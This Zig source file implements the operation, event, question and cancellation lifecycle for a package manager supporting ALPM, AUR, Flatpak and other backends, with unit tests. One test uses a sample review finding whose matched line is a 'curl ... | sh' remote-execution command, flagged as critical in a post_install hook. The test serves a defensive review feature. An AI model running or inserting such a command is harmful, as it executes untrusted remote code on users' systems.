//! Shared operation lifecycle for every package backend.
//!
//! The context owns its subscription records and any deferred question
//! responses, but borrows callback functions, callback data, operation
//! subjects, and event payload slices. Event and cancellation callbacks run
//! synchronously on the thread that emits or cancels the operation. A consumer
//! must unsubscribe before its callback data is destroyed and must copy any
//! borrowed event data it needs after the callback returns.
//!
//! The context must outlive attached managers and active operations. Managers
//! do not take ownership of it. Question handlers may answer immediately or
//! return `.deferred` and later call `respond`; copied response storage remains
//! owned by the context/returned `OwnedQuestionResponse` until deinitialized.

const std = @import("std");

pub const OperationId = u64;
pub const QuestionId = u64;
pub const SubscriptionId = u64;

pub const Backend = enum {
    alpm,
    aur,
    flatpak,
    appimage,
    local_package,
    download,
};

pub const OperationKind = enum {
    install,
    remove,
    update,
    sync,
    search,
    download,
    build,
    cleanup,
    inspect,
    configure,
    launch,
};

pub const StatusLevel = enum {
    debug,
    information,
    warning,
    success,
};

pub const CompletionStatus = enum {
    success,
    failed,
    cancelled,
};

pub const OperationDescriptor = struct {
    backend: Backend,
    kind: OperationKind,
    subject: ?[]const u8 = null,
};

pub const Envelope = struct {
    operation_id: OperationId,
    parent_id: ?OperationId,
    backend: Backend,
    kind: OperationKind,
    subject: ?[]const u8,
};

pub const ProgressUpdate = struct {
    stage: ?[]const u8 = null,
    completed: ?u64 = null,
    total: ?u64 = null,
    percentage: ?f64 = null,
    bytes_completed: ?u64 = null,
    bytes_total: ?u64 = null,
    bytes_per_second: ?u64 = null,
    message: ?[]const u8 = null,
    native_code: ?i64 = null,
};

pub const StartedEvent = struct {
    envelope: Envelope,
};

pub const ProgressEvent = struct {
    envelope: Envelope,
    update: ProgressUpdate,
};

pub const StatusEvent = struct {
    envelope: Envelope,
    level: StatusLevel,
    message: []const u8,
    code: ?[]const u8 = null,
    native_code: ?i64 = null,
};

pub const ErrorEvent = struct {
    envelope: Envelope,
    err: anyerror,
    message: []const u8,
    domain: ?[]const u8 = null,
    native_code: ?i64 = null,
    recoverable: bool = false,
};

pub const CompletedEvent = struct {
    envelope: Envelope,
    status: CompletionStatus,
};

/// Every slice in an event is borrowed and is valid only for the duration of
/// the callback. Consumers must duplicate values that need to outlive it.
pub const Event = union(enum) {
    started: StartedEvent,
    progress: ProgressEvent,
    status: StatusEvent,
    failure: ErrorEvent,
    completed: CompletedEvent,
};

pub const QuestionKind = enum {
    confirmation,
    import_pgp_key,
    confirm_transaction,
    select_one,
    select_many,
    select_provider,
    select_optional_dependencies,
    review_changes,
};

/// A source-signing key requested by a reviewed PKGBUILD. The fingerprint is
/// the complete value pinned by `validpgpkeys`, never a short GnuPG key ID.
pub const PgpKeyImportPayload = struct {
    package_name: []const u8,
    fingerprint: []const u8,
};

pub const QuestionOption = struct {
    id: []const u8,
    label: []const u8,
    description: []const u8 = "",
    is_installed: bool = false,
    is_selected: bool = false,
};

pub const QuestionPurpose = enum {
    generic,
    cache_clean_extra_entries,
    package_conflict,
}; 

pub const QuestionAttachment = struct {
    name: []const u8,
    media_type: []const u8 = "text/plain",
    content: []const u8,
};

pub const ReviewSeverity = enum {
    info,
    warning,
    critical,
};

pub const ReviewFinding = struct {
    tool: []const u8,
    severity: ReviewSeverity,
    hook: []const u8,
    matched_line: []const u8,
    message: []const u8,
};

/// Structured data for a review question. The slices are borrowed for the
/// duration of `Operation.ask`; question handlers must copy anything they need
/// after returning.
pub const ReviewPayload = struct {
    subject: []const u8,
    old_content: []const u8,
    new_content: []const u8,
    findings: []const ReviewFinding = &.{},
    related_files: []const QuestionAttachment = &.{},
};

pub const TransactionAction = enum {
    install,
    update,
    remove,
};

pub const TransactionPackageSource = enum {
    repository,
    aur,
    local,
};

pub const TransactionPackageRole = enum {
    requested,
    dependency,
    runtime_dependency,
    build_dependency,
    check_dependency,
    optional_dependency,
};

/// A package in a prepared transaction. Null sizes mean the value cannot be
/// known until the package is built (AUR/local packages) or until a later ALPM
/// transaction resolves it.
pub const TransactionPackage = struct {
    name: []const u8,
    version: ?[]const u8 = null,
    repository: ?[]const u8 = null,
    package_base: ?[]const u8 = null,
    revision: ?[]const u8 = null,
    source: TransactionPackageSource,
    role: TransactionPackageRole,
    download_size: ?u64 = null,
    installed_size: ?u64 = null,
};

/// Structured transaction data borrowed for the duration of `Operation.ask`.
pub const TransactionPlan = struct {
    action: TransactionAction,
    packages: []const TransactionPackage,
    total_download_size: ?u64 = null,
    total_installed_size: ?u64 = null,
    net_installed_size: ?i64 = null,
};

pub const QuestionResponse = union(enum) {
    default,
    accepted,
    declined,
    choice: usize,
    choices: []const usize,
    package: []const u8,
    deferred,
};

pub const QuestionRequest = struct {
    kind: QuestionKind,
    purpose: QuestionPurpose = .generic,
    prompt: []const u8,
    arguments: []const []const u8 = &.{},
    options: []const QuestionOption = &.{},
    attachments: []const QuestionAttachment = &.{},
    review: ?ReviewPayload = null,
    transaction_plan: ?TransactionPlan = null,
    dependency_name: ?[]const u8 = null,
    pgp_key_import: ?PgpKeyImportPayload = null,
    default_response: QuestionResponse = .default,
};

pub const Question = struct {
    question_id: QuestionId,
    envelope: Envelope,
    kind: QuestionKind,
    purpose: QuestionPurpose,
    prompt: []const u8,
    arguments: []const []const u8,
    options: []const QuestionOption,
    attachments: []const QuestionAttachment,
    review: ?ReviewPayload,
    transaction_plan: ?TransactionPlan,
    dependency_name: ?[]const u8,
    pgp_key_import: ?PgpKeyImportPayload = null,
    default_response: QuestionResponse,
};

pub const OwnedQuestionResponse = struct {
    response: QuestionResponse,

    pub fn init(allocator: std.mem.Allocator, response: QuestionResponse) !OwnedQuestionResponse {
        return .{ .response = switch (response) {
            .choices => |values| .{ .choices = try allocator.dupe(usize, values) },
            .package => |value| .{ .package = try allocator.dupe(u8, value) },
            else => response,
        } };
    }

    pub fn deinit(self: *OwnedQuestionResponse, allocator: std.mem.Allocator) void {
        switch (self.response) {
            .choices => |values| allocator.free(values),
            .package => |value| allocator.free(value),
            else => {},
        }
        self.* = undefined;
    }
};

pub const EventHandler = struct {
    pub const Fn = *const fn (data: ?*anyopaque, event: Event) void;

    function: Fn,
    data: ?*anyopaque = null,
};

pub const QuestionHandler = struct {
    pub const Fn = *const fn (data: ?*anyopaque, question: Question) QuestionResponse;

    function: Fn,
    data: ?*anyopaque = null,
};

pub const CancellationHandler = struct {
    pub const Fn = *const fn (data: ?*anyopaque) void;

    function: Fn,
    data: ?*anyopaque = null,
};

const EventSubscription = struct {
    id: SubscriptionId,
    handler: EventHandler,
};

const CancellationSubscription = struct {
    id: SubscriptionId,
    handler: CancellationHandler,
};

const PendingQuestion = struct {
    response: ?OwnedQuestionResponse = null,
};

pub const RespondError = error{
    UnknownQuestion,
    QuestionAlreadyAnswered,
    DeferredResponseNotAllowed,
};

pub const OperationContext = struct {
    allocator: std.mem.Allocator,
    io: std.Io,
    event_subscriptions: std.ArrayList(EventSubscription) = .empty,
    cancellation_subscriptions: std.ArrayList(CancellationSubscription) = .empty,
    question_handler: ?QuestionHandler = null,
    pending_questions: std.AutoHashMap(QuestionId, PendingQuestion),
    mutex: std.Io.Mutex = .init,
    question_condition: std.Io.Condition = .init,
    next_operation_id: std.atomic.Value(u64) = .init(1),
    next_question_id: std.atomic.Value(u64) = .init(1),
    next_subscription_id: std.atomic.Value(u64) = .init(1),
    active_operations: std.atomic.Value(usize) = .init(0),
    active_cancellation_dispatches: std.atomic.Value(usize) = .init(0),
    cancelled: std.atomic.Value(bool) = .init(false),

    pub fn init(allocator: std.mem.Allocator, io: std.Io) OperationContext {
        return .{
            .allocator = allocator,
            .io = io,
            .pending_questions = std.AutoHashMap(QuestionId, PendingQuestion).init(allocator),
        };
    }

    /// The context must outlive every attached manager and operation. Deinit is
    /// only valid after all operations and callbacks have completed.
    pub fn deinit(self: *OperationContext) void {
        std.debug.assert(self.active_operations.load(.acquire) == 0);
        std.debug.assert(
            self.active_cancellation_dispatches.load(.acquire) == 0,
        );

        self.mutex.lockUncancelable(self.io);
        var pending = self.pending_questions.valueIterator();
        while (pending.next()) |entry| {
            if (entry.response) |*response| response.deinit(self.allocator);
        }
        self.pending_questions.deinit();
        self.event_subscriptions.deinit(self.allocator);
        self.cancellation_subscriptions.deinit(self.allocator);
        self.mutex.unlock(self.io);
        self.* = undefined;
    }

    /// Registers borrowed callback state and returns a stable removal token.
    pub fn subscribe(self: *OperationContext, handler: EventHandler) !SubscriptionId {
        const id = self.next_subscription_id.fetchAdd(1, .monotonic);
        self.mutex.lockUncancelable(self.io);
        defer self.mutex.unlock(self.io);
        try self.event_subscriptions.append(self.allocator, .{ .id = id, .handler = handler });
        return id;
    }

    pub fn unsubscribe(self: *OperationContext, id: SubscriptionId) bool {
        self.mutex.lockUncancelable(self.io);
        defer self.mutex.unlock(self.io);
        for (self.event_subscriptions.items, 0..) |entry, index| {
            if (entry.id != id) continue;
            _ = self.event_subscriptions.swapRemove(index);
            return true;
        }
        return false;
    }

    /// Replaces the single borrowed question handler. Passing null restores
    /// request defaults and backend-specific compatibility handlers.
    pub fn setQuestionHandler(self: *OperationContext, handler: ?QuestionHandler) void {
        self.mutex.lockUncancelable(self.io);
        self.question_handler = handler;
        self.mutex.unlock(self.io);
    }

    pub fn hasQuestionHandler(self: *OperationContext) bool {
        self.mutex.lockUncancelable(self.io);
        defer self.mutex.unlock(self.io);
        return self.question_handler != null;
    }

    /// Registers a synchronous borrowed cancellation adapter.
    pub fn subscribeCancellation(self: *OperationContext, handler: CancellationHandler) !SubscriptionId {
        const id = self.next_subscription_id.fetchAdd(1, .monotonic);
        self.mutex.lockUncancelable(self.io);
        defer self.mutex.unlock(self.io);
        try self.cancellation_subscriptions.append(self.allocator, .{ .id = id, .handler = handler });
        return id;
    }

    pub fn unsubscribeCancellation(self: *OperationContext, id: SubscriptionId) bool {
        self.mutex.lockUncancelable(self.io);
        defer self.mutex.unlock(self.io);
        for (self.cancellation_subscriptions.items, 0..) |entry, index| {
            if (entry.id != id) continue;
            _ = self.cancellation_subscriptions.swapRemove(index);
            return true;
        }
        return false;
    }

    /// Waits for cancellation callbacks that were snapshotted before an
    /// unsubscribe to return. Call this after removing a borrowed cancellation
    /// handler and before destroying the handler's data.
    pub fn waitForCancellationCallbacks(
        self: *const OperationContext,
    ) void {
        var spins: usize = 0;
        while (self.active_cancellation_dispatches.load(.acquire) != 0) {
            if (spins < 64) {
                std.atomic.spinLoopHint();
                spins += 1;
            } else {
                std.Thread.yield() catch {};
            }
        }
    }

    /// Begins an owned operation value. Its descriptor slices must remain valid
    /// until `finish` returns.
    pub fn begin(self: *OperationContext, descriptor: OperationDescriptor) Operation {
        return self.beginChild(null, descriptor);
    }

    fn beginChild(self: *OperationContext, parent_id: ?OperationId, descriptor: OperationDescriptor) Operation {
        const id = self.next_operation_id.fetchAdd(1, .monotonic);
        _ = self.active_operations.fetchAdd(1, .monotonic);
        const operation: Operation = .{
            .context = self,
            .envelope = .{
                .operation_id = id,
                .parent_id = parent_id,
                .backend = descriptor.backend,
                .kind = descriptor.kind,
                .subject = descriptor.subject,
            },
        };
        self.emit(.{ .started = .{ .envelope = operation.envelope } });
        return operation;
    }

    pub fn isCancelled(self: *const OperationContext) bool {
        return self.cancelled.load(.acquire);
    }

    /// Cancellation remains set until reset. Reset must only be called while no
    /// operations are active.
    pub fn resetCancellation(self: *OperationContext) void {
        std.debug.assert(self.active_operations.load(.acquire) == 0);
        self.cancelled.store(false, .release);
    }

    pub fn cancel(self: *OperationContext) void {
        if (self.cancelled.swap(true, .acq_rel)) return;
        _ = self.active_cancellation_dispatches.fetchAdd(1, .acq_rel);
        defer _ = self.active_cancellation_dispatches.fetchSub(
            1,
            .acq_rel,
        );

        const snapshot = self.snapshotCancellationHandlers() catch &.{};
        defer if (snapshot.len != 0) self.allocator.free(snapshot);
        for (snapshot) |handler| handler.function(handler.data);

        self.question_condition.broadcast(self.io);
    }

    pub fn respond(
        self: *OperationContext,
        question_id: QuestionId,
        response: QuestionResponse,
    ) (RespondError || std.mem.Allocator.Error)!void {
        if (response == .deferred) return RespondError.DeferredResponseNotAllowed;
        var owned = try OwnedQuestionResponse.init(self.allocator, response);
        errdefer owned.deinit(self.allocator);

        self.mutex.lockUncancelable(self.io);
        defer self.mutex.unlock(self.io);
        const pending = self.pending_questions.getPtr(question_id) orelse return RespondError.UnknownQuestion;
        if (pending.response != null) return RespondError.QuestionAlreadyAnswered;
        pending.response = owned;
        self.question_condition.broadcast(self.io);
    }

    fn ask(self: *OperationContext, envelope: Envelope, request: QuestionRequest) !OwnedQuestionResponse {
        if (self.isCancelled()) return error.Cancelled;
        const id = self.next_question_id.fetchAdd(1, .monotonic);

        self.mutex.lockUncancelable(self.io);
        self.pending_questions.put(id, .{}) catch |err| {
            self.mutex.unlock(self.io);
            return err;
        };
        const handler = self.question_handler;
        self.mutex.unlock(self.io);
        errdefer {
            self.mutex.lockUncancelable(self.io);
            if (self.pending_questions.getPtr(id)) |pending| {
                if (pending.response) |*response| response.deinit(self.allocator);
            }
            _ = self.pending_questions.remove(id);
            self.mutex.unlock(self.io);
        }

        const question: Question = .{
            .question_id = id,
            .envelope = envelope,
            .purpose = request.purpose,
            .kind = request.kind,
            .prompt = request.prompt,
            .arguments = request.arguments,
            .options = request.options,
            .attachments = request.attachments,
            .review = request.review,
            .transaction_plan = request.transaction_plan,
            .dependency_name = request.dependency_name,
            .pgp_key_import = request.pgp_key_import,
            .default_response = request.default_response,
        };

        const immediate = if (handler) |registered|
            registered.function(registered.data, question)
        else
            request.default_response;

        if (immediate != .deferred) {
            var result = try OwnedQuestionResponse.init(self.allocator, immediate);
            errdefer result.deinit(self.allocator);
            self.mutex.lockUncancelable(self.io);
            if (self.pending_questions.getPtr(id)) |pending| {
                if (pending.response) |*response| response.deinit(self.allocator);
            }
            _ = self.pending_questions.remove(id);
            self.mutex.unlock(self.io);
            return result;
        }

        self.mutex.lockUncancelable(self.io);
        defer self.mutex.unlock(self.io);
        while (true) {
            const pending = self.pending_questions.getPtr(id) orelse return error.UnknownQuestion;
            if (pending.response) |response| {
                pending.response = null;
                _ = self.pending_questions.remove(id);
                return response;
            }
            if (self.isCancelled()) {
                _ = self.pending_questions.remove(id);
                return error.Cancelled;
            }
            self.question_condition.waitUncancelable(self.io, &self.mutex);
        }
    }

    fn emit(self: *OperationContext, event: Event) void {
        const snapshot = self.snapshotEventHandlers() catch return;
        defer self.allocator.free(snapshot);
        for (snapshot) |handler| handler.function(handler.data, event);
    }

    fn snapshotEventHandlers(self: *OperationContext) ![]EventHandler {
        self.mutex.lockUncancelable(self.io);
        defer self.mutex.unlock(self.io);
        const handlers = try self.allocator.alloc(EventHandler, self.event_subscriptions.items.len);
        for (self.event_subscriptions.items, handlers) |entry, *handler| handler.* = entry.handler;
        return handlers;
    }

    fn snapshotCancellationHandlers(self: *OperationContext) ![]CancellationHandler {
        self.mutex.lockUncancelable(self.io);
        defer self.mutex.unlock(self.io);
        const handlers = try self.allocator.alloc(CancellationHandler, self.cancellation_subscriptions.items.len);
        for (self.cancellation_subscriptions.items, handlers) |entry, *handler| handler.* = entry.handler;
        return handlers;
    }
};

pub const Operation = struct {
    context: *OperationContext,
    envelope: Envelope,
    completed: bool = false,

    pub fn child(self: *const Operation, descriptor: OperationDescriptor) Operation {
        return self.context.beginChild(self.envelope.operation_id, descriptor);
    }

    pub fn status(
        self: *const Operation,
        level: StatusLevel,
        message: []const u8,
        code: ?[]const u8,
        native_code: ?i64,
    ) void {
        self.context.emit(.{ .status = .{
            .envelope = self.envelope,
            .level = level,
            .message = message,
            .code = code,
            .native_code = native_code,
        } });
    }

    pub fn progress(self: *const Operation, update: ProgressUpdate) void {
        self.context.emit(.{ .progress = .{ .envelope = self.envelope, .update = update } });
    }

    pub fn reportError(
        self: *const Operation,
        err: anyerror,
        message: []const u8,
        domain: ?[]const u8,
        native_code: ?i64,
        recoverable: bool,
    ) void {
        self.context.emit(.{ .failure = .{
            .envelope = self.envelope,
            .err = err,
            .message = message,
            .domain = domain,
            .native_code = native_code,
            .recoverable = recoverable,
        } });
    }

    pub fn ask(self: *const Operation, request: QuestionRequest) !OwnedQuestionResponse {
        return self.context.ask(self.envelope, request);
    }

    pub fn isCancelled(self: *const Operation) bool {
        return self.context.isCancelled();
    }

    pub fn checkCancelled(self: *const Operation) error{Cancelled}!void {
        if (self.isCancelled()) return error.Cancelled;
    }

    pub fn finish(self: *Operation, status_value: CompletionStatus) void {
        if (self.completed) return;
        self.completed = true;
        self.context.emit(.{ .completed = .{ .envelope = self.envelope, .status = status_value } });
        _ = self.context.active_operations.fetchSub(1, .release);
    }
};

test "operation context emits correlated parent and child events" {
    const Capture = struct {
        ids: [4]OperationId = undefined,
        parents: [4]?OperationId = undefined,
        count: usize = 0,

        fn event(data: ?*anyopaque, value: Event) void {
            const self: *@This() = @ptrCast(@alignCast(data.?));
            const envelope = switch (value) {
                inline else => |payload| payload.envelope,
            };
            self.ids[self.count] = envelope.operation_id;
            self.parents[self.count] = envelope.parent_id;
            self.count += 1;
        }
    };

    var threaded: std.Io.Threaded = .init(std.testing.allocator, .{});
    defer threaded.deinit();
    var context = OperationContext.init(std.testing.allocator, threaded.io());
    defer context.deinit();
    var capture: Capture = .{};
    _ = try context.subscribe(.{ .function = Capture.event, .data = &capture });

    var parent = context.begin(.{ .backend = .aur, .kind = .install, .subject = "demo" });
    var child = parent.child(.{ .backend = .download, .kind = .download, .subject = "demo.tar.zst" });
    child.finish(.success);
    parent.finish(.success);

    try std.testing.expectEqual(@as(usize, 4), capture.count);
    try std.testing.expectEqual(parent.envelope.operation_id, capture.parents[1].?);
    try std.testing.expectEqual(capture.ids[1], capture.ids[2]);
}

test "operation context supports immediate and deferred question responses" {
    const Responder = struct {
        context: *OperationContext,
        deferred: bool,

        fn answer(data: ?*anyopaque, question: Question) QuestionResponse {
            const self: *@This() = @ptrCast(@alignCast(data.?));
            if (!self.deferred) return .accepted;
            self.context.respond(question.question_id, .{ .choice = 1 }) catch unreachable;
            return .deferred;
        }
    };

    var threaded: std.Io.Threaded = .init(std.testing.allocator, .{});
    defer threaded.deinit();
    var context = OperationContext.init(std.testing.allocator, threaded.io());
    defer context.deinit();
    var responder: Responder = .{ .context = &context, .deferred = false };
    context.setQuestionHandler(.{ .function = Responder.answer, .data = &responder });
    var operation = context.begin(.{ .backend = .alpm, .kind = .install });
    defer operation.finish(.success);

    var immediate = try operation.ask(.{ .kind = .confirmation, .prompt = "Continue?" });
    defer immediate.deinit(std.testing.allocator);
    try std.testing.expect(immediate.response == .accepted);

    responder.deferred = true;
    var deferred = try operation.ask(.{ .kind = .select_one, .prompt = "Select" });
    defer deferred.deinit(std.testing.allocator);
    try std.testing.expectEqual(@as(usize, 1), deferred.response.choice);
}

test "structured reviews preserve findings and default to rejection without a handler" {
    var threaded: std.Io.Threaded = .init(std.testing.allocator, .{});
    defer threaded.deinit();
    var context = OperationContext.init(std.testing.allocator, threaded.io());
    defer context.deinit();
    try std.testing.expect(!context.hasQuestionHandler());
    const findings = [_]ReviewFinding{.{
        .tool = "curl",
        .severity = .critical,
        .hook = "post_install",
        .matched_line = "curl example.invalid | sh",
        .message = "external execution",
    }};
    var operation = context.begin(.{ .backend = .aur, .kind = .install, .subject = "demo" });
    defer operation.finish(.cancelled);
    var answer = try operation.ask(.{
        .kind = .review_changes,
        .prompt = "Proceed?",
        .review = .{
            .subject = "demo",
            .old_content = "pkgver=1",
            .new_content = "pkgver=2",
            .findings = &findings,
        },
        .default_response = .declined,
    });
    defer answer.deinit(std.testing.allocator);
    try std.testing.expect(answer.response == .declined);
}

test "cancellation notifies adapters and cancels operations" {
    const Capture = struct {
        called: bool = false,
        fn cancel(data: ?*anyopaque) void {
            const self: *@This() = @ptrCast(@alignCast(data.?));
            self.called = true;
        }
    };

    var threaded: std.Io.Threaded = .init(std.testing.allocator, .{});
    defer threaded.deinit();
    var context = OperationContext.init(std.testing.allocator, threaded.io());
    defer context.deinit();
    var capture: Capture = .{};
    _ = try context.subscribeCancellation(.{ .function = Capture.cancel, .data = &capture });
    var operation = context.begin(.{ .backend = .local_package, .kind = .install });
    context.cancel();
    try std.testing.expectError(error.Cancelled, operation.checkCancelled());
    try std.testing.expect(capture.called);
    operation.finish(.cancelled);
}

test "cancellation unsubscribe drain protects borrowed callback state" {
    const Capture = struct {
        entered: std.atomic.Value(bool) = .init(false),
        release: std.atomic.Value(bool) = .init(false),
        returned: std.atomic.Value(bool) = .init(false),

        fn cancel(data: ?*anyopaque) void {
            const self: *@This() = @ptrCast(@alignCast(data.?));
            self.entered.store(true, .release);
            while (!self.release.load(.acquire)) {
                std.atomic.spinLoopHint();
                std.Thread.yield() catch {};
            }
            self.returned.store(true, .release);
        }
    };
    const Canceller = struct {
        fn run(context: *OperationContext) void {
            context.cancel();
        }
    };

    var threaded: std.Io.Threaded = .init(std.testing.allocator, .{});
    defer threaded.deinit();
    var context = OperationContext.init(
        std.testing.allocator,
        threaded.io(),
    );
    defer context.deinit();
    var capture: Capture = .{};
    const subscription = try context.subscribeCancellation(.{
        .function = Capture.cancel,
        .data = &capture,
    });
    const thread = try std.Thread.spawn(.{}, Canceller.run, .{&context});
    defer {
        capture.release.store(true, .release);
        thread.join();
    }
    while (!capture.entered.load(.acquire)) {
        std.atomic.spinLoopHint();
        std.Thread.yield() catch {};
    }

    try std.testing.expect(context.unsubscribeCancellation(subscription));
    try std.testing.expect(
        context.active_cancellation_dispatches.load(.acquire) != 0,
    );
    capture.release.store(true, .release);
    context.waitForCancellationCallbacks();
    try std.testing.expect(capture.returned.load(.acquire));
    try std.testing.expectEqual(
        @as(usize, 0),
        context.active_cancellation_dispatches.load(.acquire),
    );
}

test "subscription identifiers remain stable after removals" {
    const Capture = struct {
        first: usize = 0,
        second: usize = 0,

        fn firstHandler(data: ?*anyopaque, _: Event) void {
            const self: *@This() = @ptrCast(@alignCast(data.?));
            self.first += 1;
        }

        fn secondHandler(data: ?*anyopaque, _: Event) void {
            const self: *@This() = @ptrCast(@alignCast(data.?));
            self.second += 1;
        }
    };

    var threaded: std.Io.Threaded = .init(std.testing.allocator, .{});
    defer threaded.deinit();
    var context = OperationContext.init(std.testing.allocator, threaded.io());
    defer context.deinit();
    var capture: Capture = .{};
    const first = try context.subscribe(.{ .function = Capture.firstHandler, .data = &capture });
    const second = try context.subscribe(.{ .function = Capture.secondHandler, .data = &capture });

    try std.testing.expect(context.unsubscribe(first));
    try std.testing.expect(!context.unsubscribe(first));
    var operation = context.begin(.{ .backend = .download, .kind = .download });
    operation.finish(.success);
    try std.testing.expectEqual(@as(usize, 0), capture.first);
    try std.testing.expectEqual(@as(usize, 2), capture.second);
    try std.testing.expect(context.unsubscribe(second));
}
